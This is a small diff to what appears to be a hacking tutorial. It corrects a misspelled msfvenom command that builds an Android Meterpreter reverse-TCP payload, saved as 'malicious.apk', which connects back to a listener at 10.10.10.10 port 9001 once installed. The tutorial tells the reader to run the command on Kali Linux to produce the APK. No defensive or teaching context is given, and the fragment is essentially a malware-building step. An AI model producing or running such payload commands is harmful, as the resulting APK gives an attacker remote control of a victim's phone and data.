@@ -5,7 +5,7 @@
 login to your kali linux machine, open terminal and type this command 
 
 ```bash
-msfvenvenom --platform android -p android/meterpreter/reverse_tcp lhost=10.10.10.10 lport=9001 R -o malicious.apk
+msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=10.10.10.10 lport=9001 R -o malicious.apk
 ```
 
 it will generate a apk file. 
